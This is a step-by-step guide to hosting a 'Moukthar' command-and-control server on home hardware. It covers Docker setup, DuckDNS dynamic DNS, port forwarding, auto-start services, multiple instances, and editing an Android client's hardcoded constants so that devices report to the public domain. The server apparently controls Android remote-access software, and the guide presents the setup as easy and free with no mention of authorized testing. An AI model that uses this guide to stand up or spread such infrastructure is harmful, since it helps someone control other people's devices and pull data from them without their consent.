# Home Server Deployment Guide

## Overview

Run your C2 server from home, completely free:
- No monthly costs (just electricity)
- Complete control
- Perfect for development and testing
- Works with any computer

**Cost: $0/month (+ electricity)**

---

## Prerequisites

- Computer with Docker and Docker Compose installed
- Home internet connection
- Dynamic DNS service (free: duckdns.org)
- Home router with port forwarding capability
- Computer can stay on 24/7 (or use a cheap Raspberry Pi)

---

## Hardware Options

### Best: Raspberry Pi 4

- Cost: $35-100
- Power: 2-6W (~$2-3/month)
- Performance: Adequate for C2 server
- Space: Tiny

**Install Docker on Raspberry Pi:**
```bash
curl -fsSL https://get.docker.com | sh
sudo usermod -aG docker pi
```

### Good: Old Laptop/PC

- Cost: Free (reuse existing)
- Power: 30-100W (~$3-10/month)
- Performance: More than enough
- Space: Moderate

**Make sure to:**
- Remove battery (if laptop)
- Plug in power
- Configure to never sleep
- Good ventilation

### Acceptable: Your Main Computer

- Cost: $0
- Power: Varies
- Performance: Excellent
- Space: Uses your computer

**Not recommended if:**
- Your computer is turned off daily
- You need your computer for other things
- You have limited uptime

---

## Step 1: Install Docker and Docker Compose

### On Mac:
```bash
# Install Homebrew (if not already)
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Install Docker Desktop
brew install --cask docker

# Or download from docker.com
```

### On Windows:
```
1. Download Docker Desktop for Windows
2. Install and follow setup instructions
3. Enable WSL2 integration
4. Restart computer
```

Download from: https://www.docker.com/products/docker-desktop

### On Linux (Ubuntu/Debian):
```bash
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh
sudo usermod -aG docker $USER
sudo apt install docker-compose
```

### On Raspberry Pi:
```bash
curl -fsSL https://get.docker.com | sh
sudo usermod -aG docker pi
sudo apt install -y docker-compose
```

---

## Step 2: Get Your Home IP Address

### Find Local IP:

**Mac/Linux:**
```bash
ifconfig | grep "inet "
```

**Windows (PowerShell):**
```powershell
ipconfig
```

**Raspberry Pi:**
```bash
hostname -I
```

Look for something like `192.168.x.x` or `10.x.x.x`

Example: `192.168.1.100`

---

## Step 3: Setup Dynamic DNS

Your home IP changes periodically. Dynamic DNS keeps your domain updated.

### Use DuckDNS (Free)

1. Go to [duckdns.org](https://www.duckdns.org)
2. Sign in with GitHub/Google
3. Create a domain (e.g., `moukthar.duckdns.org`)
4. Note your token
5. Test: Click "check ip" → should work

### Setup Auto-Update

Your IP updates automatically by calling DuckDNS regularly.

**On Mac/Linux/Pi (Cron):**

```bash
# Edit crontab
crontab -e

# Add this line (updates every 5 minutes)
*/5 * * * * curl "https://www.duckdns.org/update?domains=moukthar&token=YOUR_TOKEN&ip="
```

**On Windows (Task Scheduler):**

1. Open Task Scheduler
2. Create Basic Task
3. Name: "Update DuckDNS"
4. Trigger: Every 5 minutes
5. Action: Run program
6. Program: `powershell.exe`
7. Arguments: `-Command "Invoke-WebRequest 'https://www.duckdns.org/update?domains=moukthar&token=YOUR_TOKEN&ip='"`
8. Click OK

---

## Step 4: Configure Port Forwarding

Your router forwards internet traffic to your computer.

### In Your Router:

1. **Find Router IP:** Usually `192.168.1.1` or `192.168.0.1`
2. **Login:** Open browser, type router IP
3. **Find Port Forwarding:**
   - Usually under: Settings → Port Forwarding
   - Or: Advanced → NAT → Port Forwarding
4. **Add Two Rules:**

**Rule 1 (HTTP):**
- External Port: `80`
- Internal Port: `80`
- Internal IP: Your computer's local IP (e.g., `192.168.1.100`)

**Rule 2 (WebSocket):**
- External Port: `8080`
- Internal Port: `8080`
- Internal IP: Your computer's local IP (e.g., `192.168.1.100`)

### Test Port Forwarding:

```bash
# From another network (use phone hotspot):
curl http://moukthar.duckdns.org

# Should show: Connection refused (good, server not running yet)
# Should NOT show: Connection timeout (bad, port not forwarded)
```

---

## Step 5: Clone Repository

```bash
# Clone your repository
git clone https://github.com/YOUR_USERNAME/moukthar.git
cd moukthar/Server
```

---

## Step 6: Configure for Remote Access

Update the WebSocket URI:

```bash
# Edit docker-compose.yml
nano docker-compose.yml  # Mac/Linux
# or use Notepad on Windows
```

Change:
```yaml
WEBSOCKET_URI: 'ws://localhost:8080'
```

To:
```yaml
WEBSOCKET_URI: 'ws://moukthar.duckdns.org:8080'
```

Or if your DuckDNS domain is different:
```yaml
WEBSOCKET_URI: 'ws://your-domain.duckdns.org:8080'
```

Save the file.

---

## Step 7: Start Docker Services

```bash
# Navigate to Server directory
cd moukthar/Server

# Build and start all services
docker-compose up -d --build

# Check status
docker-compose ps
```

Wait 1-2 minutes for MySQL to initialize.

Check logs:
```bash
docker-compose logs mysql    # Should say "ready for connections"
docker-compose logs php-apache
docker-compose logs websocket
```

---

## Step 8: Access Your C2 Server

### Local Access (From Same WiFi):

```
http://192.168.1.100
```

Or:
```
http://moukthar.duckdns.org
```

### Remote Access (From Anywhere):

```
http://moukthar.duckdns.org
```

Login with:
- **Username:** android
- **Password:** android

---

## Step 9: Configure Android Client

Update the client to point to your domain:

**File:** `Client/app/src/main/java/com/ot/grhq/client/functionality/Utils.java`

Change:
```java
private static final String C2_SERVER = "http://localhost";
public static final String WEB_SOCKET_SERVER = "ws://localhost:8080";
```

To:
```java
private static final String C2_SERVER = "http://moukthar.duckdns.org";
public static final String WEB_SOCKET_SERVER = "ws://moukthar.duckdns.org:8080";
```

---

## Monitoring

### View Logs

```bash
docker-compose logs -f              # All services
docker-compose logs -f php-apache   # Web server
docker-compose logs -f mysql         # Database
docker-compose logs -f websocket     # WebSocket
```

### Check Services Running

```bash
docker-compose ps
```

Expected output:
```
NAME              STATUS
moukthar-mysql    Up (healthy)
moukthar-web      Up
moukthar-websocket Up
```

### Check Disk Space

```bash
df -h        # Mac/Linux
dir C:\     # Windows
```

---

## Keeping Services Running

### Auto-Start on Boot

**On Mac (using LaunchAgent):**

```bash
# Create file
mkdir -p ~/Library/LaunchAgents
cat > ~/Library/LaunchAgents/com.moukthar.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.moukthar.c2</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/docker-compose</string>
        <string>-f</string>
        <string>/path/to/moukthar/Server/docker-compose.yml</string>
        <string>up</string>
        <string>-d</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

# Enable
launchctl load ~/Library/LaunchAgents/com.moukthar.plist
```

**On Linux (using systemd):**

```bash
# Create service file
sudo nano /etc/systemd/system/moukthar.service
```

Content:
```ini
[Unit]
Description=Moukthar C2 Server
After=network.target

[Service]
Type=simple
User=ubuntu
WorkingDirectory=/home/ubuntu/moukthar/Server
ExecStart=/usr/local/bin/docker-compose up -d
ExecStop=/usr/local/bin/docker-compose down
Restart=always

[Install]
WantedBy=multi-user.target
```

Then:
```bash
sudo systemctl daemon-reload
sudo systemctl enable moukthar
sudo systemctl start moukthar
```

**On Windows (using Task Scheduler):**

1. Open Task Scheduler
2. Create Basic Task
3. Name: "Start Moukthar"
4. Trigger: "At startup"
5. Action: Start a program
6. Program: `cmd.exe`
7. Arguments: `/c cd C:\path\to\moukthar\Server && docker-compose up -d`
8. Check "Run with highest privileges"

**On Raspberry Pi:**

Same as Linux (systemd method above).

---

## Managing Services

### Stop All Services

```bash
docker-compose down
```

### Restart All Services

```bash
docker-compose restart
```

### Restart Specific Service

```bash
docker-compose restart php-apache
docker-compose restart mysql
docker-compose restart websocket
```

### Update Code

```bash
# Pull latest changes
git pull

# Rebuild containers
docker-compose down
docker-compose up -d --build
```

---

## Troubleshooting

### Can't access from internet

1. Check port forwarding in router
2. Verify DuckDNS is updated: `curl https://www.duckdns.org/update?domains=moukthar`
3. Check DuckDNS shows your IP: `nslookup moukthar.duckdns.org`
4. Verify services running: `docker-compose ps`

### WebSocket won't connect

1. Check WebSocket container: `docker-compose ps websocket`
2. Check firewall not blocking port 8080
3. Verify `WEBSOCKET_URI` in docker-compose.yml
4. Try direct: `curl http://moukthar.duckdns.org:8080`

### MySQL won't start

1. Check logs: `docker-compose logs mysql`
2. Wait 30-60 seconds, try again
3. Check disk space: `df -h`
4. Restart: `docker-compose restart mysql`

### Ports in use

If ports 80, 3306, or 8080 are already in use:

Edit `docker-compose.yml`:
```yaml
ports:
  - "8000:80"    # Changed from 80:80
  - "3307:3306"  # Changed from 3306:3306
  - "8081:8080"  # Changed from 8080:8080
```

Then access at: `http://moukthar.duckdns.org:8000`

---

## Performance Optimization

### For Old Hardware

Edit `docker-compose.yml`:
```yaml
services:
  php-apache:
    deploy:
      resources:
        limits:
          memory: 256M  # Limit to 256MB
```

### For High Traffic

Edit `docker-compose.yml`:
```yaml
services:
  php-apache:
    deploy:
      resources:
        limits:
          memory: 2G  # Increase to 2GB
```

---

## Security Best Practices

### Change Default Credentials

Edit `docker-compose.yml`:
```yaml
environment:
  MYSQL_PASSWORD: 'your-strong-password'
```

Then update `.env` files and Android client.

### Enable HTTPS

Using ngrok (free tunnel with HTTPS):

```bash
# Install ngrok
brew install ngrok  # Mac
# Or download from ngrok.com

# Run ngrok
ngrok http 80

# Get HTTPS URL, update client
```

### Firewall Rules

Allow only necessary ports:
- Port 80 (HTTP)
- Port 8080 (WebSocket)
- Block port 3306 (MySQL - internal only)

---

## Cost Analysis

### Electricity Cost

**Raspberry Pi:**
- Power: 2W
- Monthly cost: 2W × 24h × 30d × $0.12/kWh = $0.17

**Old Laptop:**
- Power: 40W
- Monthly cost: 40W × 24h × 30d × $0.12/kWh = $3.46

**Home PC:**
- Power: 60W
- Monthly cost: 60W × 24h × 30d × $0.12/kWh = $5.18

**Total Cost: $0.17 - $5.18/month** (Just electricity!)

---

## Long-Term Maintenance

### Weekly
- Check `docker-compose logs` for errors
- Verify DuckDNS is updating: `curl https://www.duckdns.org`

### Monthly
- Update code: `git pull`
- Backup database: `docker-compose exec mysql mysqldump -u android -p cc > backup.sql`
- Check disk space: `df -h`

### Quarterly
- Update Docker: `docker version`
- Update system: `sudo apt update && sudo apt upgrade`
- Review logs for security issues

---

## When to Migrate

Consider moving to cloud if:
- Your computer needs to be turned off
- You need 99.9% uptime guarantee
- You want professional support
- You have high traffic

Options:
- **Oracle Cloud** (Free forever): [ORACLE_CLOUD_SETUP.md](ORACLE_CLOUD_SETUP.md)
- **Railway** (Free for 2-3 months): [RAILWAY_SETUP.md](RAILWAY_SETUP.md)

---

## Advanced: Multiple Instances

Run multiple C2 servers on different ports:

```yaml
services:
  server-1:
    ports:
      - "80:80"
      - "8080:8080"

  server-2:
    ports:
      - "81:80"
      - "8081:8080"
```

Access at:
- Server 1: `http://domain`
- Server 2: `http://domain:81`

---

## Next Steps

1. ✅ Docker installed
2. ✅ DuckDNS configured
3. ✅ Port forwarding setup
4. ✅ Server running at moukthar.duckdns.org
5. 🔄 Configure Android client
6. 🔄 Keep computer on 24/7

---

**You're now running a free C2 server from home!**

Costs: Just electricity ($0.17-$5/month)
Uptime: Depends on your hardware and internet

Enjoy!
